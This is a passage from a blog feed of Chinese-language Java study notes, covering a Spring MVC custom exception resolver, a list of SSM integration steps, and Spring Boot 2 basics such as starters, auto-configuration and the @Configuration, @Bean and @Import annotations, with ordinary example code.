class="hljs-name">beans</span>&gt;</span></code></pre></div><h3 id="配置web-xml-1"><a href="#配置web-xml-1" class="headerlink" title="配置web.xml"></a>配置web.xml</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.0&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>classpath:springmvc.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">context-param</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>classpath:spring.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">context-param</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span></code></pre></div><h2 id="配置自定义异常解析器"><a href="#配置自定义异常解析器" class="headerlink" title="配置自定义异常解析器"></a>配置自定义异常解析器</h2><p>总体步骤和配置简单异常解析器一样，另配置以下配置</p><h3 id="创建自定义异常解析器"><a href="#创建自定义异常解析器" class="headerlink" title="创建自定义异常解析器"></a>创建自定义异常解析器</h3><p>CustomExceptionResolver.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.pacemrc.resolver;<span class="hljs-keyword">import</span> com.pacemrc.exception.CustomException;<span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerExceptionResolver;<span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomExceptionResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerExceptionResolver</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">resolveException</span><span class="hljs-params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e)</span> &#123;        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">modelAndView</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>();        <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> ClassCastException)&#123;            modelAndView.addObject(<span class="hljs-string">&quot;info&quot;</span>,<span class="hljs-string">&quot;自定义异常解析器-类型转换异常&quot;</span>);        &#125;<span class="hljs-keyword">else</span> &#123;            modelAndView.addObject(<span class="hljs-string">&quot;info&quot;</span>,<span class="hljs-string">&quot;自定义异常解析器-通用异常&quot;</span>);        &#125;        modelAndView.setViewName(<span class="hljs-string">&quot;/autoView.jsp&quot;</span>);        <span class="hljs-keyword">return</span> modelAndView;    &#125;&#125;</code></pre></div><h3 id="创建视图-1"><a href="#创建视图-1" class="headerlink" title="创建视图"></a>创建视图</h3><p>autoView.jsp</p><div class="code-wrapper"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;自定义异常视图&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div><h3 id="配置springmvc-xml-3"><a href="#配置springmvc-xml-3" class="headerlink" title="配置springmvc.xml"></a>配置springmvc.xml</h3><p>在springmvc.xml中加入以下配置，同时<code>将之前的简单异常解析器配置注释掉</code></p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--定义自定义异常解析器--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.pacemrc.resolver.CustomExceptionResolver&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SSM整合</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/SSM%E6%95%B4%E5%90%88/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/SSM%E6%95%B4%E5%90%88/</url>
    
    <content type="html"><![CDATA[<h1 id="SSM整合"><a href="#SSM整合" class="headerlink" title="SSM整合"></a>SSM整合</h1><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><p>1、创建实体的数据库表</p><p>2、创建实体的Java类</p><p>3、创建实体的Mapper接口</p><p>4、创建Service接口和其实现类</p><p>5、创建Controller类</p><p>6、编写视图页面</p><p>7、创建配置文件</p><p>Spring核心配置文件</p><p>SpringMVC核心配置文件</p><p>Mybatis映射文件</p><p>Mybatis核心配置文件</p><p>数据库连接信息文件</p><p>web.xml文件</p><p>日志文件</p>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>springboot</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/springboot/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/springboot/</url>
    
    <content type="html"><![CDATA[<h1 id="基础入门"><a href="#基础入门" class="headerlink" title="基础入门"></a>基础入门</h1><p>本文为Springboot2的学习记录</p><h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><h3 id="Spring能做什么"><a href="#Spring能做什么" class="headerlink" title="Spring能做什么"></a>Spring能做什么</h3><p>![](&#x2F;Users&#x2F;pacemrc&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20240711142202172.png)</p><h3 id="Spring生态"><a href="#Spring生态" class="headerlink" title="Spring生态"></a>Spring生态</h3><p>Spring生态覆盖了：web开发、数据访问、安全控制、分布式、消息服务、移动开发、批处理等</p><p>![](&#x2F;Users&#x2F;pacemrc&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20240711143245967.png) </p><h3 id="Spring5重大升级"><a href="#Spring5重大升级" class="headerlink" title="Spring5重大升级"></a>Spring5重大升级</h3><ul><li>响应式编程</li><li>内部源码设计</li></ul><p>基于Java8的一些新特性，如：接口默认实现，Spring重新设计源码架构。</p><h2 id="Springboot"><a href="#Springboot" class="headerlink" title="Springboot"></a>Springboot</h2><h3 id="Springboot是什么"><a href="#Springboot是什么" class="headerlink" title="Springboot是什么"></a>Springboot是什么</h3><div class="code-wrapper"><pre><code class="hljs">Springboot是整合Spring技术栈的一站式开发框架Springboot是简化Spring技术栈的快速开发脚手架</code></pre></div><h3 id="为什么要用Springboot"><a href="#为什么要用Springboot" class="headerlink" title="为什么要用Springboot"></a>为什么要用Springboot</h3><blockquote><p>Spring Boot makes it easy to create stand-alone, production-grade Spring based Applications that you can “just run”.</p></blockquote><div class="code-wrapper"><pre><code class="hljs">能够快速开发出基于Spring的生产级应用</code></pre></div><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li><p>Create stand-alone Spring applications</p><p>创建独立的Spring应用</p></li><li><p>Embed Tomcat, Jetty or Undertow directly (no need to deploy WAR files)</p></li></ul><p>​直接内嵌Tomcat，Jetty或者Undertow，无需部署war文件</p><ul><li>Provide opinionated ‘starter’ dependencies to simplify your build configuration</li></ul><p>​提供自定义的启动器来简化构建配置</p><ul><li>Automatically configure Spring and 3rd party libraries whenever possible</li></ul><p>​自动配置Spring和第三方库</p><ul><li>Provide production-ready features such as metrics, health checks, and externalized configuration</li></ul><p>​提供用于生产级别的功能，如指标、健康检查和外部化配置</p><ul><li>Absolutely no code generation and no requirement for XML configuration</li></ul><p>​完全无代码生成，无需XML配置文件</p><h3 id="时代背景"><a href="#时代背景" class="headerlink" title="时代背景"></a>时代背景</h3><h4 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h4><blockquote><p><a href="https://martinfowler.com/microservices/">https://martinfowler.com/microservices/</a></p><p>简而言之，微服务架构风格是一种将单个应用程序作为小型服务套件来开发的方法，每个服务在自己的进程中运行，并通过轻量级机制（通常是 HTTP 资源 API）进行通信。 这些服务围绕业务功能构建，可通过全自动部署机制独立部署。 这些服务可能使用不同的编程语言编写，也可能使用不同的数据存储技术。</p></blockquote><ul><li>微服务是一种架构风格</li><li>将一个应用拆分为一组小型服务来开发</li><li>每个服务运行在自己的进程内，也就是可独立部署和升级</li><li>服务之间使用轻量级HTTP交互</li><li>这些服务围绕业务功能拆分</li><li>可以由全自动部署机制独立部署</li><li>去中心化，服务自治。服务可以使用不同的编程语言开发，使用不同的存储技术</li></ul><h4 id="分布式"><a href="#分布式" class="headerlink" title="分布式"></a>分布式</h4><ul><li>分布式的难点</li></ul><p>远程调用、服务发现、负载均衡、服务容错、配置管理、服务监控、链路追踪、日志管理、任务调度等</p><ul><li>springboot的解决方法</li></ul><p>springboot+ springcloud</p><h4 id="云原生"><a href="#云原生" class="headerlink" title="云原生"></a>云原生</h4><ul><li>原生应用上云的难点</li></ul><p>服务自愈、弹性伸缩、服务隔离、自动化部署、灰度发布、流量治理等</p><h3 id="如何学习Springboot"><a href="#如何学习Springboot" class="headerlink" title="如何学习Springboot"></a>如何学习Springboot</h3><ul><li>根据官网文档</li></ul><p><a href="https://docs.spring.io/spring-boot/docs/2.7.18/reference/html/">https://docs.spring.io/spring-boot/docs/2.7.18/reference/html/</a></p><ul><li>查看版本特性</li></ul><p><a href="https://github.com/spring-projects/spring-boot/wiki#release-notes">https://github.com/spring-projects/spring-boot/wiki#release-notes</a></p><h2 id="自动配置原理"><a href="#自动配置原理" class="headerlink" title="自动配置原理"></a>自动配置原理</h2><h3 id="Springboot特点"><a href="#Springboot特点" class="headerlink" title="Springboot特点"></a>Springboot特点</h3><h4 id="依赖管理"><a href="#依赖管理" class="headerlink" title="依赖管理"></a>依赖管理</h4><ul><li>spring-boot-dependencies</li></ul><p>在maven的pom.xml配置文件中会配置一个<code>spring-boot-starter-parent</code>父依赖</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span></code></pre></div><p>点进<code>spring-boot-starter-parent</code>会还有一个父依赖<code>spring-boot-dependencies</code></p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span></code></pre></div><p>点进<code>spring-boot-dependencies</code> 其在<code>properties</code>标签中声明了所有开发中常用的依赖的版本号,<code>自动进行版本仲裁机制</code>。</p><p>![](&#x2F;Users&#x2F;pacemrc&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20240711161347030.png) </p><ul><li>spring-boot-starter-*</li></ul><p>springboot让整合其他框架变得十分简单，只需要引入<code>spring-boot-starter-*</code>依赖，这个组件的所有常规依赖就可以被自动加载</p><p><strong>所有启动器查阅</strong></p><div class="code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>docs.spring.io<span class="hljs-regexp">/spring-boot/</span>docs<span class="hljs-regexp">/2.7.18/</span>reference<span class="hljs-regexp">/html/u</span>sing.html<span class="hljs-comment">#using.build-systems.starters</span></code></pre></div><p>例如</p><div class="code-wrapper"><pre><code class="hljs xml">//springboot引入使用 Thymeleaf 视图构建 MVC Web 应用程序<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>//springboot引入使用 Tomcat 作为嵌入式 servlet 容器的启动器<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><p>所有以<code>spring-boot-starter-*</code>命名格式的依赖都是springboot官方配置的依赖，也可自定义结合第三方库配置启动器，第三方启动器的命名格式为<code>*-spring-boot-starter</code></p><p>例如</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><p>所有场景启动其的最底层依赖是<code>spring-boot-starter</code></p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><p><code>spring-boot-starter-parent</code>和<code>spring-boot-starter-*</code>可以使得在开发过程中无需关注依赖组件的版本号，springboot会自动进行版本仲裁。</p><p>若自动仲裁的版本不符合实际开发需求，可在pom.xml文件中的<code>properties</code>标签中声明组件使用的版本</p><p>例如</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">mysql.version</span>&gt;</span>5.1.43<span class="hljs-tag">&lt;/<span class="hljs-name">mysql.version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span></code></pre></div><h4 id="自动配置"><a href="#自动配置" class="headerlink" title="自动配置"></a>自动配置</h4><ul><li><p>自动配置tomcat</p><ul><li>引入<code>spring-boot-starter-tomcat</code>依赖即完成tomcat的配置</li></ul></li><li><p>自动配置spring-mvc</p><ul><li>引入<code>spring-boot-starter-web</code>依赖即引入SpringMVC全套组件并自动配好SpringMVC常用组件（功能）</li></ul></li><li><p>自动配好Web常见功能，如：字符编码问题</p><ul><li>SpringBoot帮我们配置好了所有web开发的常见场景</li></ul></li><li><p>默认的包结构</p><ul><li>主程序(SpringBootApplication.java)所在包及其下面的所有子包里面的组件都会被默认扫描</li><li>无需配置包扫描</li><li>若需要改变包扫描路径，可配置@SpringBootApplication(scanBasePackages&#x3D;”com.example.xxx”)或@ComponentScan</li></ul><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@SpringBootApplication</span>等同于<span class="hljs-variable">@SpringBootConfiguration</span><span class="hljs-variable">@EnableAutoConfiguration</span><span class="hljs-variable">@ComponentScan</span>(<span class="hljs-string">&quot;com.example.xxx&quot;</span>)</code></pre></div></li><li><p>配置文件</p><p>springboot项目的配置统一在<code>application.properties</code>或<code>application.yml</code>文件中配置</p><p>配置文件所有配置项查询：</p><div class="code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>docs.spring.io<span class="hljs-regexp">/spring-boot/</span>docs<span class="hljs-regexp">/2.7.18/</span>reference<span class="hljs-regexp">/html/</span>application-properties.html<span class="hljs-comment">#appendix.application-properties</span></code></pre></div><ul><li>默认配置最终都是映射到某个类上，如：MultipartProperties</li><li>在配置文件中自定义配置的值最终会绑定个某个类上，这个类会在容器中创建对象</li></ul></li></ul><p>![](&#x2F;Users&#x2F;pacemrc&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20240711164245454.png) </p><p>例如，在配置文件中进入<code>server.port</code>会发现关联到<code>ServerProperties</code>类的<code>setPort</code>方法</p><p>![](&#x2F;Users&#x2F;pacemrc&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20240711164540101.png) </p><ul><li>按需加载所有自动配置项<ul><li>引入了哪些启动器，这些启动器的自动配置才会开启</li><li>springboot的所有自动配置功能都在<code>spring-boot-autoconfigure</code>包里</li></ul></li></ul><h3 id="容器功能"><a href="#容器功能" class="headerlink" title="容器功能"></a>容器功能</h3><h4 id="组件添加"><a href="#组件添加" class="headerlink" title="组件添加"></a>组件添加</h4><h5 id="Configuration"><a href="#Configuration" class="headerlink" title="@Configuration"></a>@Configuration</h5><p>使用<code>@Configuration</code>注解标注在类上，表明这个类是spring的配置类。该配置类也是容器中的一个对象</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;&#125;</code></pre></div><h5 id="Bean"><a href="#Bean" class="headerlink" title="@Bean"></a>@Bean</h5><p>使用<code>@Bean</code>注解标注在方法上，向容器内注册对象。方法名为bean对象的id，方法的返回值类型为bean对象类型，返回值，就是组件在容器中的实例。</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><span class="hljs-keyword">public</span> User <span class="hljs-title function_">user01</span><span class="hljs-params">()</span> &#123;  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;user01&quot;</span>,<span class="hljs-number">18</span>);&#125;</code></pre></div><h5 id="Configuration-proxyBeanMethods-true"><a href="#Configuration-proxyBeanMethods-true" class="headerlink" title="@Configuration(proxyBeanMethods &#x3D; true)"></a>@Configuration(proxyBeanMethods &#x3D; true)</h5><p>proxyBeanMethods：代理bean的方法，默认为true，<code>用于解决容器内组件依赖的问题</code></p><ul><li>Full(proxyBeanMethods &#x3D; true)、【保证每个@Bean方法被调用多少次返回的组件都是单实例的】</li><li>Lite(proxyBeanMethods &#x3D; false)【每个@Bean方法被调用多少次返回的组件都是新创建的】</li><li>组件依赖必须使用Full模式默认。其他默认是否Lite模式</li></ul><p>代码示例</p><p>MyConfig.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ch.qos.logback.core.helpers.Transform;<span class="hljs-keyword">import</span> com.pacemrc.springboot.SpringbootApplication;<span class="hljs-keyword">import</span> com.pacemrc.springboot.domain.Pet;<span class="hljs-keyword">import</span> com.pacemrc.springboot.domain.User;<span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.condition.ConditionalOnBean;<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;<span class="hljs-keyword">import</span> org.springframework.context.ConfigurableApplicationContext;<span class="hljs-keyword">import</span> org.springframework.context.annotation.*;<span class="hljs-meta">@ImportResource(&#123;&quot;classpath:spring.xml&quot;&#125;)</span><span class="hljs-meta">@Import(&#123;User.class, Transform.class&#125;)</span><span class="hljs-meta">@Configuration</span><span class="hljs-comment">/**</span><span class="hljs-comment"> * proxyBeanMethods = true  会检查容器中对象是否存在，</span><span class="hljs-comment"> * Full (proxyBeanMethods = true)</span><span class="hljs-comment"> * Lite (proxyBeanMethods = false)</span><span class="hljs-comment"> * 解决容器中组件互相依赖的问题</span><span class="hljs-comment"> *</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * <span class="hljs-doctag">@Import</span>(&#123;User.class, Pet.class&#125;)</span><span class="hljs-comment"> *   给容器中自动创建该类型的组件，调用无参构造函数，并将其注册到容器中</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;    <span class="hljs-meta">@Bean</span>    <span class="hljs-keyword">public</span> Pet <span class="hljs-title function_">tomcat</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pet</span>(<span class="hljs-string">&quot;tomcat&quot;</span>);    &#125;    <span class="hljs-meta">@Bean</span>    <span class="hljs-meta">@ConditionalOnBean(name = &quot;tomcat&quot;)</span>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">user01</span><span class="hljs-params">()</span> &#123;        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;user01&quot;</span>, <span class="hljs-number">18</span>);        user.setPet(tomcat());        <span class="hljs-keyword">return</span> user;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-comment">//1、返回IOC容器</span>        <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> SpringApplication.run(SpringbootApplication.class, args);        <span class="hljs-comment">// 查看springboot默认所有的bean</span>        String[] beanDefinitionNames = run.getBeanDefinitionNames();        <span class="hljs-keyword">for</span> (String beanDefinitionName : beanDefinitionNames) &#123;            System.out.println(beanDefinitionName);        &#125;        <span class="hljs-comment">//3、从容器中获取组件</span>        <span class="hljs-type">User</span> <span class="hljs-variable">user01</span> <span class="hljs-operator">=</span> run.getBean(<span class="hljs-string">&quot;user01&quot;</span>,User.class);        System.out.println(user01);        <span class="hljs-type">User</span> <span class="hljs-variable">user02</span> <span class="hljs-operator">=</span> run.getBean(<span class="hljs-string">&quot;user01&quot;</span>,User.class);        System.out.println(user02);        System.out.println(<span class="hljs-string">&quot;组件是否相等：&quot;</span> + (user01 == user02));        <span class="hljs-comment">//配置类也是一个容器组件,组件是单例模式</span>        <span class="hljs-type">MyConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> run.getBean(MyConfig.class);        System.out.println(config);        <span class="hljs-comment">//如果@Configuration(proxyBeanMethods = true)代理对象调用方法。SpringBoot总会检查这个组件是否在容器中有。</span>        <span class="hljs-comment">//保持组件单实例</span>        <span class="hljs-type">User</span> <span class="hljs-variable">user1</span> <span class="hljs-operator">=</span> config.user01();        <span class="hljs-type">User</span> <span class="hljs-variable">user2</span> <span class="hljs-operator">=</span> config.user01();        System.out.println(<span class="hljs-string">&quot;组件是否相等：&quot;</span> + (user1 == user2));        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> run.getBean(<span class="hljs-string">&quot;user01&quot;</span>, User.class);        <span class="hljs-type">Pet</span> <span class="hljs-variable">pet</span> <span class="hljs-operator">=</span> run.getBean(<span class="hljs-string">&quot;tomcat&quot;</span>, Pet.class);        System.out.println(<span class="hljs-string">&quot;组件是否是同一个&quot;</span> + (user.getPet() == pet));        <span class="hljs-comment">//查看指定类型的所有组件</span>        String[] beanNamesForType = run.getBeanNamesForType(User.class);        <span class="hljs-keyword">for</span> (String beanName : beanNamesForType) &#123;            System.out.println(beanName);        &#125;        <span class="hljs-comment">// 查看指定类型的bean,包括子类</span>        <span class="hljs-type">Transform</span> <span class="hljs-variable">transform</span> <span class="hljs-operator">=</span> run.getBean(Transform.class);        System.out.println(transform);        <span class="hljs-type">boolean</span> <span class="hljs-variable">result1</span> <span class="hljs-operator">=</span> run.containsBean(<span class="hljs-string">&quot;tomcat&quot;</span>);        System.out.println(<span class="hljs-string">&quot;是否存在tomcat组件：&quot;</span> + result1);        <span class="hljs-type">boolean</span> <span class="hljs-variable">result2</span> <span class="hljs-operator">=</span> run.containsBean(<span class="hljs-string">&quot;user01&quot;</span>);        System.out.println(<span class="hljs-string">&quot;是否存在user01组件：&quot;</span> + result2);    &#125;&#125;</code></pre></div><h5 id="Import"><a href="#Import" class="headerlink" title="@Import"></a>@Import</h5><p>语法：@Import({ XXX.class[,XXX.class]})</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Import(&#123;User.class, Transform.class&#125;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;&#125;=======String[] beanNamesForType = run.getBeanNamesForType(User.class);<span class="hljs-keyword">for</span> (String beanName : beanNamesForType) &#123;    System.out.println(beanName);&#125;<span class="hljs-type">Transform</span> <span class="hljs-variable">transform</span> <span class="hljs-operator">=</span> run.getBean(Transform.class);System.out.println(transform);</code></pre></div><p>向容器中自动使用指定类的无参构造函数创建出这两个类型的组件、默认组件的名字就是全类名</p><p>![](&#x2F;Users&#x2F;pacemrc&#x2F;Library&#x2F;Application 